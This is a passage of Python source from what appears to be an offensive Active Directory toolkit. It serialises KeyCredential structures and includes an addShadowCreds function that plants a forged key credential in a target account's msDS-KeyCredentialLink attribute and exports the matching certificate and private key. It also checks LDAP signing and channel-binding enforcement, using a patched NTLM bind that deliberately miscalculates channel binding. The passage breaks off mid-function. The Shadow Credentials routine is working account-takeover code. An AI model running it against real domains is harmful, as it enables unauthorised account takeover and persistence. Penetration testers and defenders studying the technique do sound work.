		hex_c = hex(self.c)[2:].rjust(4, '0')
		hex_d = hex(self.d)[2:].rjust(4, '0')
		hex_e = hex(self.e)[2:].rjust(12, '0')
		return "%s-%s-%s-%s-%s" % (hex_a, hex_b, hex_c, hex_d, hex_e)

	def toFormatB(self) -> str:
		# B => 32 digits separated by hyphens, enclosed in braces :
		# {00000000-0000-0000-0000-000000000000}
		hex_a = hex(self.a)[2:].rjust(8, '0')
		hex_b = hex(self.b)[2:].rjust(4, '0')
		hex_c = hex(self.c)[2:].rjust(4, '0')
		hex_d = hex(self.d)[2:].rjust(4, '0')
		hex_e = hex(self.e)[2:].rjust(12, '0')
		return "{%s-%s-%s-%s-%s}" % (hex_a, hex_b, hex_c, hex_d, hex_e)

	def toFormatP(self) -> str:
		# P => 32 digits separated by hyphens, enclosed in parentheses :
		# (00000000-0000-0000-0000-000000000000)
		hex_a = hex(self.a)[2:].rjust(8, '0')
		hex_b = hex(self.b)[2:].rjust(4, '0')
		hex_c = hex(self.c)[2:].rjust(4, '0')
		hex_d = hex(self.d)[2:].rjust(4, '0')
		hex_e = hex(self.e)[2:].rjust(12, '0')
		return "(%s-%s-%s-%s-%s)" % (hex_a, hex_b, hex_c, hex_d, hex_e)

	def toFormatX(self) -> str:
		# X => Four hexadecimal values enclosed in braces, where the fourth value is a subset of
		# eight hexadecimal values that is also enclosed in braces :
		# {0x00000000,0x0000,0x0000,{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}}
		hex_a = hex(self.a)[2:].rjust(8, '0')
		hex_b = hex(self.b)[2:].rjust(4, '0')
		hex_c = hex(self.c)[2:].rjust(4, '0')
		hex_d = hex(self.d)[2:].rjust(4, '0')
		hex_d1, hex_d2 = hex_d[:2], hex_d[2:4]
		hex_e = hex(self.e)[2:].rjust(12, '0')
		hex_e1, hex_e2, hex_e3, hex_e4, hex_e5, hex_e6 = hex_e[:2], hex_e[2:4], hex_e[4:6], hex_e[6:8], hex_e[8:10], hex_e[10:12]
		return "{0x%s,0x%s,0x%s,{0x%s,0x%s,0x%s,0x%s,0x%s,0x%s,0x%s,0x%s}}" % (hex_a, hex_b, hex_c, hex_d1, hex_d2, hex_e1, hex_e2, hex_e3, hex_e4, hex_e5, hex_e6)

	def __repr__(self):
		return "<Guid %s>" % self.toFormatB()

class DateTime(object):
	"""
	Documentation for class DateTime

	https://docs.microsoft.com/en-us/dotnet/api/system.datetime?view=net-5.0
	"""

	def __init__(self, ticks: int = 0):
		if ticks == 0:
			self.Value = datetime.datetime.now()
			# diff 1601 - epoch
			diff = datetime.datetime(1970, 1, 1, 0, 0, 0) - datetime.datetime(1601, 1, 1, 0, 0, 0)
			# nanoseconds between 1601 and epoch
			diff_ns = int(diff.total_seconds()) * 1000000000
			# nanoseconds between epoch and now
			now_ns = time.time_ns()
			# ticks between 1601 and now
			ticks = (diff_ns + now_ns) // 100
			self.ticks = ticks
		else:
			self.Value = datetime.datetime(1601, 1, 1, 0, 0, 0) + datetime.timedelta(seconds=ticks / 1e7)
			self.ticks = ticks

	def toUniversalTime(self):
		return self.Value.utcnow()

	def toTicks(self):
		return self.ticks

	def __repr__(self):
		return str(self.Value)

def ComputeHash(data: bytes):
	sha256 = hashlib.sha256(data)
	return sha256.digest()

def ConvertFromBinaryIdentifier(keyIdentifier, version: KeyCredentialVersion):
	if version in [KeyCredentialVersion.Version0.value, KeyCredentialVersion.Version1.value]:
		return binascii.hexlify(keyIdentifier).decode("utf-8")
	if version == KeyCredentialVersion.Version2.value:
		return base64.b64encode(keyIdentifier).decode("utf-8")
	else:
		return base64.b64encode(keyIdentifier).decode("utf-8")

def ComputeKeyIdentifier(keyMaterial: bytes, version: KeyCredentialVersion):
	binaryId = ComputeHash(keyMaterial)
	return ConvertFromBinaryIdentifier(binaryId, version)

class EmptyRawDNWithBinary(Exception):
	"""Raised when the input value is too small"""
	pass

class InvalidBinaryDataLength(Exception):
	"""Raised when the input value is too large"""
	pass

class InvalidNumberOfPartsInRawDNWithBinary(Exception):
	"""Raised when the input value is too large"""
	pass

class DNWithBinary(object):
	"""
	The DNWithBinary class represents the DN-Binary LDAP attribute syntax,
	which contains a binary value and a distinguished name (DN).
	"""

	# String representation of DN-Binary data: B:<char count>:<binary value>:<object DN>
	_StringFormat = "B:%d:%s:%s"
	_StringFormatPrefix = b"B:"
	_StringFormatSeparator = b":"

	DistinguishedName = b""
	BinaryData = b""

	def __init__(self, DistinguishedName: str, binaryData: bytes):
		super(DNWithBinary, self).__init__()
		assert (len(DistinguishedName) != 0)
		assert (len(binaryData) != 0)
		self.DistinguishedName = DistinguishedName
		self.BinaryData = binaryData

	@classmethod
	def fromRawDNWithBinary(cls, rawDNWithBinary:bytes):
		if len(rawDNWithBinary) == 0:
			raise EmptyRawDNWithBinary("rawDNWithBinary cannot be empty.")

		numberOfColons = rawDNWithBinary.count(cls._StringFormatSeparator)

		if numberOfColons != 3:
			raise InvalidNumberOfPartsInRawDNWithBinary("rawDNWithBinary should have exactly four parts separated by colons (:).")

		_B, size, binaryPart, DistinguishedName = rawDNWithBinary.split(cls._StringFormatSeparator)
		size = int(size)

		if len(binaryPart) != size:
			raise InvalidBinaryDataLength("Invalid BinaryData length. The length specified in the header does not match the data length.")

		binaryPart = binascii.unhexlify(binaryPart)

		return cls(DistinguishedName, binaryPart)

	def toString(self):
		hexdata = binascii.hexlify(self.BinaryData).decode("UTF-8")
		# return self._StringFormat % (len(self.BinaryData) * 2, hexdata, self.DistinguishedName.decode("UTF-8"))
		return self._StringFormat % (len(self.BinaryData) * 2, hexdata, self.DistinguishedName)

	def __repr__(self):
		return self.toString()

class KeyCredentialEntryType(Enum):
	"""
	Key Credential Link Entry Identifier

	Describes the data stored in the Value field.
	https://msdn.microsoft.com/en-us/library/mt220499.aspx
	"""

	# A SHA256 hash of the Value field of the KeyMaterial entry
	KeyID = 0x01

	# A SHA256 hash of all entries following this entry
	KeyHash = 0x02

	# Key material of the credential
	KeyMaterial = 0x03

	# Key Usage
	KeyUsage = 0x04

	# Key Source
	KeySource = 0x05

	# Device Identifier
	DeviceId = 0x06

	# Custom key information
	CustomKeyInformation = 0x07

	# The approximate time this key was last used, in FILETIME format
	KeyApproximateLastLogonTimeStamp = 0x08

	# The approximate time this key was created, in FILETIME format
	KeyCreationTime = 0x09

def ConvertFromBinaryTime(rawBinaryTime: bytes, source: KeySource, version: KeyCredentialVersion):
	"""
	Documentation for ConvertFromBinaryTime

	Src : https://github.com/microsoft/referencesource/blob/master/mscorlib/system/datetime.cs
	"""

	timeStamp = struct.unpack('<Q', rawBinaryTime)[0]

	# AD and AAD use a different time encoding
	if version == KeyCredentialVersion.Version0.value:
		return DateTime(timeStamp)
	if version == KeyCredentialVersion.Version1.value:
		return DateTime(timeStamp)
	if version == KeyCredentialVersion.Version2.value:
		if source == KeySource.AD.value:
			return DateTime(timeStamp)
		else:
			# print("This is not fully supported right now, you may encounter issues. Please contact us @podalirius_ @_nwodtuhs if you are in this case")
			return DateTime(timeStamp)
	else:
		if source == KeySource.AD.value:
			return DateTime(timeStamp)
		else:
			# print("This is not fully supported right now, you may encounter issues. Please contact us @podalirius_ @_nwodtuhs if you are in this case")
			return DateTime(timeStamp)

def ConvertToBinaryTime(date: DateTime, source: KeySource, version: KeyCredentialVersion):
	"""
	Documentation for ConvertToBinaryTime

	Src : https://github.com/microsoft/referencesource/blob/master/mscorlib/system/datetime.cs
	"""

	# AD and AAD use a different time encoding
	if version == KeyCredentialVersion.Version0.value:
		return struct.pack('<Q', date.toTicks())
	if version == KeyCredentialVersion.Version1.value:
		return struct.pack('<Q', date.toTicks())
	if version == KeyCredentialVersion.Version2.value:
		if source == KeySource.AD.value:
			return struct.pack('<Q', date.toTicks())
		else:
			# print("This is not fully supported right now, you may encounter issues. Please contact us @podalirius_ @_nwodtuhs if you are in this case")
			return struct.pack('<Q', date.toTicks())
	else:
		if source == KeySource.AD.value:
			return struct.pack('<Q', date.toTicks())
		else:
			# print("This is not fully supported right now, you may encounter issues. Please contact us @podalirius_ @_nwodtuhs if you are in this case")
			return struct.pack('<Q', date.toTicks())

def ConvertToBinaryIdentifier(keyIdentifier, version: KeyCredentialVersion):
	if version in [KeyCredentialVersion.Version0.value, KeyCredentialVersion.Version1.value]:
		return binascii.unhexlify(keyIdentifier)
	if version == KeyCredentialVersion.Version2.value:
		return base64.b64decode(keyIdentifier + "===")
	else:
		return base64.b64decode(keyIdentifier + "===")

class KeyCredential(object):
	"""
	This class represents a single AD/AAD key credential.

	In Active Directory, this structure is stored as the binary portion of the msDS-KeyCredentialLink DN-Binary attribute
	in the KEYCREDENTIALLINK_BLOB format.
	The Azure Active Directory Graph API represents this structure in JSON format.

	<see>https://msdn.microsoft.com/en-us/library/mt220505.aspx</see>
	"""

	# Minimum length of the structure
	MinLength = 4
	# Version

	# V0 structure alignment in bytes
	PackSize = 4

	# Defines the version of the structure
	Version: KeyCredentialVersion = KeyCredentialVersion.Version0

	# Version 1 keys had a guid in this field instead if a hash
	Identifier: str = ""

	Usage: KeyUsage = None

	LegacyUsage: str = ""

	Source: KeySource = None

	CustomKeyInfo: CustomKeyInformation = None

	DeviceId: Guid = None

	# The approximate time this key was created
	CreationTime: DateTime = None

	# The approximate time this key was last used
	LastLogonTime: DateTime = None

	# Distinguished name of the AD object (UPN in case of AAD objects) that holds this key credential
	Owner: str = ""

	@classmethod
	def fromX509Certificate2(cls, certificate: X509Certificate2, deviceId: Guid, owner: str, currentTime: DateTime = None, isComputerKey=False):
		assert (certificate is not None)

		# Computer NGC keys are DER-encoded, while user NGC keys are encoded as BCRYPT_RSAKEY_BLOB
		if isComputerKey:
			publicKey = certificate.ExportRSAPublicKeyDER()
		else:
			publicKey = certificate.ExportRSAPublicKeyBCrypt()
		return cls(publicKey, deviceId, owner, currentTime, isComputerKey)

	def __init__(self, publicKey: RSAKeyMaterial, deviceId: Guid, owner: str, currentTime=None, isComputerKey: bool = False):
		# Process owner DN/UPN
		assert (len(owner) != 0)
		if type(owner) == str:
			self.Owner = owner
		elif type(owner) == bytes:
			self.Owner = owner.decode("UTF-8")

		# Initialize the Key Credential based on requirements stated in MS-KPP Processing Details:
		self.Version = KeyCredentialVersion.Version2
		self.Identifier = ComputeKeyIdentifier(publicKey.toRawBytes(), self.Version)
		self.KeyHash = None
		if currentTime is not None:
			if type(currentTime) == int:
				self.CreationTime = DateTime(currentTime)
			elif type(currentTime):
				self.CreationTime = currentTime
			else:
				pass
		else:
			self.CreationTime = DateTime()
		self.RawKeyMaterial = publicKey
		self.Usage = KeyUsage.NGC
		self.LegacyUsage = None
		self.Source = KeySource.AD
		self.DeviceId = deviceId
		self.computed_hash = "\x00"*16
		# Computer NGC keys have to meet some requirements to pass the validated write
		# The CustomKeyInformation entry is not present
		# The KeyApproximateLastLogonTimeStamp entry is not present
		if not isComputerKey:
			self.LastLogonTime = self.CreationTime
			self.CustomKeyInfo = CustomKeyInformation(KeyFlags.NONE)

	@classmethod
	def fromDNWithBinary(cls, dnWithBinary: DNWithBinary):
		# Input validation
		"""Validator.AssertNotNull(blob, nameof(blob))
		Validator.AssertMinLength(blob, MinLength, nameof(blob))
		Validator.AssertNotNullOrEmpty(owner, nameof(owner))"""
		assert (len(dnWithBinary.BinaryData) >= cls.MinLength)
		assert (len(dnWithBinary.DistinguishedName) > 0)

		_Version = None
		_KeyID = None
		_KeyHash = None
		_KeyMaterial = None
		_KeyUsage = None
		_KeyLegacyUsage = None
		_KeySource = None
		_DeviceId = None
		_CustomKeyInformation = None
		_KeyApproximateLastLogonTimeStamp = None
		_KeyCreationTime = None

		# Parse binary input
		stream_data = io.BytesIO(dnWithBinary.BinaryData)

		_Version = KeyCredentialVersion(struct.unpack('<L', stream_data.read(4))[0])

		# Read all entries corresponding to the KEYCREDENTIALLINK_ENTRY structure:
		read_data = stream_data.read(3)
		while read_data != b'':
			# A 16-bit unsigned integer that specifies the length of the Value field
			length, entryType = struct.unpack('<HB', read_data)
			# An 8-bit unsigned integer that specifies the type of data that is stored in the Value field
			entry = {
				"entryType": entryType,
				"data": stream_data.read(length)
			}

			if entry["entryType"] == KeyCredentialEntryType.KeyID.value:
				_KeyID = ConvertFromBinaryIdentifier(entry["data"], _Version)

			elif entry["entryType"] == KeyCredentialEntryType.KeyHash.value:
				_KeyHash = entry["data"]

			elif entry["entryType"] == KeyCredentialEntryType.KeyMaterial.value:
				_KeyMaterial = RSAKeyMaterial.fromRawBytes(entry["data"])

			elif entry["entryType"] == KeyCredentialEntryType.KeyUsage.value:
				if len(entry["data"]) == 1:
					# This is apparently a V2 structure
					_KeyUsage = KeyUsage(entry["data"][0])
				else:
					# This is a legacy structure that contains a string-encoded key usage instead of enum
					_KeyLegacyUsage = entry["data"]

			elif entry["entryType"] == KeyCredentialEntryType.KeySource.value:
				_KeySource = KeySource(entry["data"][0])

			elif entry["entryType"] == KeyCredentialEntryType.DeviceId.value:
				_DeviceId = Guid.fromRawBytes(entry["data"])

			elif entry["entryType"] == KeyCredentialEntryType.CustomKeyInformation.value:
				_CustomKeyInformation = CustomKeyInformation.fromBlob(entry["data"], _Version)

			elif entry["entryType"] == KeyCredentialEntryType.KeyApproximateLastLogonTimeStamp.value:
				_KeyApproximateLastLogonTimeStamp = ConvertFromBinaryTime(entry["data"], _KeySource, _Version)

			elif entry["entryType"] == KeyCredentialEntryType.KeyCreationTime.value:
				try:
					_KeyCreationTime = ConvertFromBinaryTime(entry["data"], _KeySource, _Version)
				except OverflowError:
					pass

			read_data = stream_data.read(3)

		self = cls(_KeyMaterial, _DeviceId, dnWithBinary.DistinguishedName, _KeyCreationTime)
		self.Version = _Version
		self.Identifier = _KeyID
		self.KeyHash = _KeyHash
		self.Usage = _KeyUsage
		self.LegacyUsage = _KeyLegacyUsage
		self.Source = _KeySource
		self.CustomKeyInfo = _CustomKeyInformation
		self.LastLogonTime = _KeyApproximateLastLogonTimeStamp

		return self

	def toString(self) -> str:
		return "Id: %s, Source: %s, Version: %s, Usage: %s, CreationTime: %s" % (
			self.Identifier,
			self.Source,
			self.Version,
			self.Usage,
			self.CreationTime
		)

	def toByteArray(self):
		# Note that we do not support the legacy V1 format yet

		# Serialize properties 3-9 first, as property 2 must contain their hash:
		binaryData = b""
		binaryProperties = b""

		# Key Material
		_data = self.RawKeyMaterial.toRawBytes()
		binaryProperties += struct.pack("<H", len(_data))
		binaryProperties += struct.pack("<B", KeyCredentialEntryType.KeyMaterial.value)
		binaryProperties += _data

		# Key Usage
		_data = None
		if self.LegacyUsage is not None and self.Usage is None:
			_data = self.LegacyUsage
		elif self.Usage is not None and self.LegacyUsage is None:
			_data = struct.pack("<B", self.Usage.value)
		binaryProperties += struct.pack("<H", len(_data))
		binaryProperties += struct.pack("<B", KeyCredentialEntryType.KeyUsage.value)
		binaryProperties += _data

		# Key Source
		_data = struct.pack("<B", self.Source.value)
		binaryProperties += struct.pack("<H", len(_data))
		binaryProperties += struct.pack("<B", KeyCredentialEntryType.KeySource.value)
		binaryProperties += _data

		# Device ID
		if self.DeviceId is not None:
			_data = self.DeviceId.toRawBytes()
			binaryProperties += struct.pack("<H", len(_data))
			binaryProperties += struct.pack("<B", KeyCredentialEntryType.DeviceId.value)
			binaryProperties += _data

		# Custom Key Information
		if self.CustomKeyInfo is not None:
			_data = self.CustomKeyInfo.toByteArray()
			binaryProperties += struct.pack("<H", len(_data))
			binaryProperties += struct.pack("<B", KeyCredentialEntryType.CustomKeyInformation.value)
			binaryProperties += _data

		# Last Logon Time
		if self.LastLogonTime is not None:
			_data = ConvertToBinaryTime(self.LastLogonTime, self.Source, self.Version)
			binaryProperties += struct.pack("<H", len(_data))
			binaryProperties += struct.pack("<B", KeyCredentialEntryType.KeyApproximateLastLogonTimeStamp.value)
			binaryProperties += _data

		# Creation Time
		_data = ConvertToBinaryTime(self.CreationTime, self.Source, self.Version)
		binaryProperties += struct.pack("<H", len(_data))
		binaryProperties += struct.pack("<B", KeyCredentialEntryType.KeyCreationTime.value)
		binaryProperties += _data

		# Creating header + hash + binaryProperties
		# Version
		binaryData += struct.pack('<L', self.Version.value)

		# Key Identifier
		_data = ConvertToBinaryIdentifier(self.Identifier, self.Version)
		binaryData += struct.pack("<H", len(_data))
		binaryData += struct.pack("<B", KeyCredentialEntryType.KeyID.value)
		binaryData += _data

		# Key Hash
		self.computed_hash = ComputeHash(binaryProperties)
		binaryData += struct.pack("<H", len(self.computed_hash))
		binaryData += struct.pack("<B", KeyCredentialEntryType.KeyHash.value)
		binaryData += self.computed_hash

		# Append the remaining entries
		binaryData += binaryProperties

		return binaryData

	def toDNWithBinary(self) -> DNWithBinary:
		# This method should only be used when the owner is in the form of a Distinguished Name
		return DNWithBinary(self.Owner, self.toByteArray())

	def verifyHash(self) -> bool:
		# Key Identifier
		self.toByteArray()
		return bool(self.computed_hash == self.KeyHash)

	def toDict(self) -> dict:
		keyCredentialDict = {
			'Owner': self.Owner,
			'Version': self.Version.value,
			'Identifier': self.Identifier,
			'KeyHash': binascii.hexlify(self.KeyHash).decode('UTF-8'),
			'CreationTime': self.CreationTime.toTicks(),
			'RawKeyMaterial': self.RawKeyMaterial.toDict(),
			'Usage': self.Usage.value,
			'LegacyUsage': self.LegacyUsage,
			'Source': self.Source.value,
			'DeviceId': self.DeviceId.toFormatD(),
			'LastLogonTime': self.LastLogonTime.toTicks(),
			# Todo : toTicks doesn't seem to work
			'CustomKeyInfo': self.CustomKeyInfo.toDict()
		}
		return keyCredentialDict

	@classmethod
	def fromDict(cls, data):
		KeyMaterial = RSAKeyMaterial.fromDict(data["RawKeyMaterial"])
		keyCredential = cls(publicKey=KeyMaterial, deviceId=Guid.fromFormatD(data["DeviceId"]), owner=data["Owner"], currentTime=DateTime(data["CreationTime"]))
		keyCredential.Version = KeyCredentialVersion(data["Version"])
		keyCredential.Identifier = data["Identifier"]
		keyCredential.KeyHash = binascii.unhexlify(data["KeyHash"])
		keyCredential.Usage = KeyUsage(data["Usage"])
		keyCredential.LegacyUsage = data["LegacyUsage"]
		keyCredential.Source = KeySource(data["Source"])
		keyCredential.CustomKeyInfo = CustomKeyInformation.fromDict(data["CustomKeyInfo"])
		keyCredential.LastLogonTime = DateTime(data["LastLogonTime"])
		return keyCredential

	def show(self):
		print("<KeyCredential structure at %s>" % hex(id(self)))
		print("  | \x1b[93mOwner\x1b[0m:", self.Owner)
		print("  | \x1b[93mVersion\x1b[0m:", hex(self.Version.value))
		print("  | \x1b[93mKeyID\x1b[0m:", self.Identifier)
		"""
		if self.verifyHash() == True:
			print("  | \x1b[93mKeyHash\x1b[0m: %s (verified=\x1b[92mTrue\x1b[0m)" % binascii.hexlify(self.KeyHash).decode('UTF-8'))
		else:
			print("  | \x1b[93mKeyHash\x1b[0m: %s (verified=\x1b[91mFalse\x1b[0m)" % binascii.hexlify(self.KeyHash).decode('UTF-8'))
		"""
		print("  | \x1b[93mKeyHash\x1b[0m: %s" % binascii.hexlify(self.KeyHash).decode('UTF-8'))
		print("  | \x1b[93mRawKeyMaterial\x1b[0m:", self.RawKeyMaterial)
		print("  |  | \x1b[93mExponent (E)\x1b[0m: %d" % self.RawKeyMaterial.exponent)
		print("  |  | \x1b[93mModulus (N)\x1b[0m: %s" % hex(self.RawKeyMaterial.modulus))
		print("  |  | \x1b[93mPrime1 (P)\x1b[0m: %s" % hex(self.RawKeyMaterial.prime1))
		print("  |  | \x1b[93mPrime2 (Q)\x1b[0m: %s" % hex(self.RawKeyMaterial.prime2))

		print("  | \x1b[93mUsage\x1b[0m:", self.Usage)
		print("  | \x1b[93mLegacyUsage\x1b[0m:", self.LegacyUsage)
		print("  | \x1b[93mSource\x1b[0m:", self.Source)
		print("  | \x1b[93mDeviceId\x1b[0m:", self.DeviceId.toFormatD())
		print("  | \x1b[93mCustomKeyInfo\x1b[0m:", self.CustomKeyInfo)
		for key in self.CustomKeyInfo.keys():
			print("  |  | \x1b[93m%s\x1b[0m:" % key, self.CustomKeyInfo[key])
		print("  | \x1b[93mLastLogonTime (UTC)\x1b[0m:", self.LastLogonTime)
		print("  | \x1b[93mCreationTime (UTC)\x1b[0m:", self.CreationTime)

	def __bytes__(self):
		return self.toByteArray()

def addShadowCreds(conn, server, sam, password = None, exportType = "PEM"):
	print_yellow("[*] Adding Shadow Creds (msDS-KeyCredentialLink)")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		dns = getDNs(conn, server, [sam])

		if len(dns) == 0:
			print("[-] Provided account not found", file = sys.stderr)
			return

		dn = dns[0]

		print("[+] Generating certificate")
		certificate = X509Certificate2(subject = sam, keySize = 2048, notBefore = (-40*365), notAfter = (40*365))
		
		print("[+] Generating KeyCredential")
		keyCredential = KeyCredential.fromX509Certificate2(certificate = certificate, deviceId = Guid(), owner = dn, currentTime = DateTime())
		print(f"[+] KeyCredential generated with DeviceID = {keyCredential.DeviceId.toFormatD()}")

		escaped_object = escape_filter_chars(dn)
		entry_generator = search(conn, server, escaped_object, f"(distinguishedName={escaped_object})", attributes = ['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
		for entry in entry_generator:
			if entry["type"] == "searchResEntry":
				new_values = entry['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
				conn.modify(dn, {'msDS-KeyCredentialLink': [MODIFY_REPLACE, new_values]})
				if conn.result['result'] == 0:
					print(f"[+] Sucessfully updated msDS-KeyCredentialLink attribute of '{sam}'")
					path = sam
					if exportType == "PEM":
						certificate.ExportPEM(path_to_files = path)
						print("[+] Saved PEM certificate into '%s'" % (path + "_cert.pem"))
						print("[+] Saved PEM certificate into '%s'" % (path + "_priv.pem"))
					elif exportType == "PFX":
						if password is None:
							password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
							print(f"[+] PFX password generated = {password}")
						certificate.ExportPFX(password = password, path_to_file = path)
						print("[+] Saved PFX certificate and private key into '%s'" % (path + ".pfx"))
				else:
					print(f"[-] Failed to edit '{sam}' attribute: {conn.result}", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

############################################################################
#                     LDAP Signing & Channel Binding                       #
############################################################################

# Check LDAP Signing enforcement
# 	1. Bind LDAP
# 	2. "stronger" in description -> Bind failed -> Enforced
#	3. "data 52e" or "data 532" in error -> Connection error -> Cannot determined
#	4. No error -> Bind succeed -> Not enforced
def checkLDAPSigning(server, userDN, nthash, kerberosAuth):
	try:
		if kerberosAuth:
			conn = Connection(server, userDN, authentication = SASL, sasl_mechanism = KERBEROS, auto_bind = False)
		else:
			conn = Connection(server, userDN, nthash, authentication = NTLM, auto_bind = False)
	except:
		return None
	_ = conn.bind()
	if "stronger" in conn.result['description']:
		return True
	elif ("data 52e" or "data 532") in conn.result['message']:
		return None
	elif 'LdapErr' not in conn.result['message']:
		return False

# Check LDAPS configuration
# 	1. Connect to port 636
# 	2. Try to wrap socket with SSL/TLS
# 	3. If no error or self-signed certificate -> SSL/TLS configured
#	4. Else -> SSL/TLS not configured (By default DCs do not have a certificate setup for LDAPS on port 636 and TLS handshake will hang)
def LDAPSCompleteHandshake(target):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(5)
	ssl_sock = ssl.wrap_socket(s, cert_reqs = ssl.CERT_OPTIONAL, suppress_ragged_eofs = False, do_handshake_on_connect = False)
	ssl_sock.connect((target, 636))
	try:
		ssl_sock.do_handshake()
		ssl_sock.close()
		return True
	except Exception as e:
		if "CERTIFICATE_VERIFY_FAILED" in str(e):
			ssl_sock.close()
			return True
		if "handshake operation timed out" in str(e):
			ssl_sock.close()
			return False
		else:
			ssl_sock.close()
			return False

# Check Channel Binding (EPA) enforcement
# 	1. Bind LDAPS without Channel Binding (EPA)
# 	2. "data 80090346" in error -> Bind failed -> Enforced
#	3. "data 52e" in error or no error -> Bind succeed -> Not enforced
#
# Note: Channel Binding (EPA) enforcement will be returned regardless of a successful LDAPS bind -> Allow checking without authentication
def checkEPA(server, userDN, nthash, kerberosAuth):
	try:
		if kerberosAuth:
			conn = Connection(server, userDN, authentication = SASL, sasl_mechanism = KERBEROS, auto_bind = False)
		else:
			conn = Connection(server, userDN, nthash, authentication = NTLM, auto_bind = False)
	except:
		return None
	_ = conn.bind()
	err = conn.result['message']
	if "data 80090346" in err:
		return True
	elif "data 52e" in err:
		return False
	elif 'LdapErr' not in err:
		return False

from ldap3.core.connection import bind_operation
def do_ntlm_bind_null_avpair_epa(self, controls): # Patch dynamically NTLM Bind of LDAP3 to force miscalculation of Channel Binding (EPA)
	self.last_error = None
	with self.connection_lock:
		if not self.sasl_in_progress:
			self.sasl_in_progress = True
			try:
				from ldap3.utils.ntlm import NtlmClient
				domain_name, user_name = self.user.split('\\', 1)
				self.ntlm_client = NtlmClient(user_name = user_name, domain = domain_name, password = self.password)
				if self.session_security == 'ENCRYPT':
					self.ntlm_client.confidentiality = True

				if self.channel_binding == TLS_CHANNEL_BINDING:
					self.ntlm_client.tls_channel_binding = True
					try:
						from cryptography import x509
						from cryptography.hazmat.backends import default_backend
						from cryptography.hazmat.primitives import hashes
					except ImportError:
						raise 'package cryptography missing'

					peer_certificate = x509.load_der_x509_certificate(self.server.tls.peer_certificate, default_backend())
					peer_certificate_hash_algorithm = peer_certificate.signature_hash_algorithm
					rfc5929_hashes_list = (hashes.MD5, hashes.SHA1)
					if isinstance(peer_certificate_hash_algorithm, rfc5929_hashes_list):
						digest = hashes.Hash(hashes.SHA256(), default_backend())
					else:
						digest = hashes.Hash(peer_certificate_hash_algorithm, default_backend())
					digest.update(self.server.tls.peer_certificate)
					peer_certificate_digest = digest.finalize()

					channel_binding_struct = bytes()
					initiator_address = b'\x00'*8
					acceptor_address = b'\x00'*8
					application_data_raw = b'tls-server-end-point:' + b"\x00" # Should be peer_certificate_digest but enforce miscalculation
					len_application_data = len(application_data_raw).to_bytes(4, byteorder='little', signed = False)
					application_data = len_application_data
					application_data += application_data_raw
					channel_binding_struct += initiator_address
					channel_binding_struct += acceptor_address
					channel_binding_struct += application_data

					from hashlib import md5
					self.ntlm_client.client_av_channel_bindings = md5(channel_binding_struct).digest()

				request = bind_operation(self.version, 'SICILY_PACKAGE_DISCOVERY', self.ntlm_client)
				response = self.post_send_single_response(self.send('bindRequest', request, controls))
				if not self.strategy.sync:
					_, result = self.get_response(response)
				else:
					result = response[0]
				if 'server_creds' in result:
					sicily_packages = result['server_creds'].decode('ascii').split(';')
					if 'NTLM' in sicily_packages:
						request = bind_operation(self.version, 'SICILY_NEGOTIATE_NTLM', self.ntlm_client)
						response = self.post_send_single_response(self.send('bindRequest', request, controls))
						if not self.strategy.sync:
							_, result = self.get_response(response)
						else:
							result = response[0]

						if result['result'] == 0:
							request = bind_operation(self.version, 'SICILY_RESPONSE_NTLM', self.ntlm_client,
														result['server_creds'])
							response = self.post_send_single_response(self.send('bindRequest', request, controls))
							if not self.strategy.sync:
								_, result = self.get_response(response)
							else:
								result = response[0]
				else:
					result = None
			finally:
				self.sasl_in_progress = False

			return result

# Check Channel Binding (EPA) policy
# 	1. Bind LDAPS with Channel Binding (EPA) miscalculated
# 	2. If "data 80090346" in err -> EPA verification occured and failed
#	3. "data 52e" in error or no error -> No EPA verification
def checkEPAPolicy(server, userDN, nthash):
	try:
		# Forcing a miscalculation of the "Channel Bindings" AV_PAIR in Type 3 NTLM message
		Connection.do_ntlm_bind = do_ntlm_bind_null_avpair_epa
		conn = Connection(server, userDN, nthash, authentication = NTLM, channel_binding = TLS_CHANNEL_BINDING, auto_bind = False)
	except Exception as e:
		return None
	_ = conn.bind()
	err = conn.result['message']
	if "data 80090346" in err:
		return True
	elif "data 52e" in err:
		return False
	elif 'LdapErr' not in err:
		return False

def checkProtections(target, username, password, nthash, domain, aesKey, ccache):
	print_yellow("[*] Checking LDAP Signing & LDAPS Channel Binding (EPA)")
	print_yellow("---")
	print()

	try:
		serverLDAPS = Server(target, use_ssl = True, get_info = ALL)
		serverLDAP = Server(target, use_ssl = False, get_info = ALL)
		kerberosAuth = False

		if aesKey != None or ccache != None:
			user_dn = f"{username}@{domain.upper()}"

			foundST = False
			if ccache != None: # Is there a valid ST ?
				ticket = KerberosUtil.CCache.loadFile(ccache)
				sName = f'ldap/{target.lower()}'
				sRealm = domain.lower()
				for creds in ticket.credentials:
					ccServiceName = creds['server'].prettyPrint().split(b'@')[0].decode('utf-8')
					ccServiceRealm = creds['server'].prettyPrint().split(b'@')[1].decode('utf-8')
					if sName == ccServiceName.lower() and sRealm == ccServiceRealm.lower(): # Found a valid ST
						foundST = True
						break

			if not foundST: # No, request It with aesKey or ccache
				print("[+] No required ST available for Kerberos authentication")
				print(f"[+] Requesting LDAP/{target} to {domain.upper()}")
				try:
					tgsRep, cipher, _, clientServiceSessionKey = KerberosUtil.requestST(domain, username, '', domain, '', aesKey, ccache, None, None, None, f"LDAP/{target}", None, None, False, False, False, None, True, skipIntro = True)
					ccache = f"{username}@ldap_{target}@{domain.upper()}.ccache"
				except Exception as e:
					return None
				
			os.environ["KRB5CCNAME"] = ccache
			kerberosAuth = True
		else:
			if (nthash != ''):
				password = "0" * 32 + ":" + nthash
			user_dn = f"{domain}\\{username}"
		
		signingRequired = checkLDAPSigning(serverLDAP, user_dn, password, kerberosAuth)
		if signingRequired == None:
			print("[-] LDAP connection failed")
			return
		elif signingRequired:
			print("[+] LDAP Signing required")
		else:
			print("[+] LDAP Signing not required")

		if not LDAPSCompleteHandshake(target):
			print(f"[-] LDAPS connection failed. DC certificate probably not configured")
		else:
			policyEPA = None
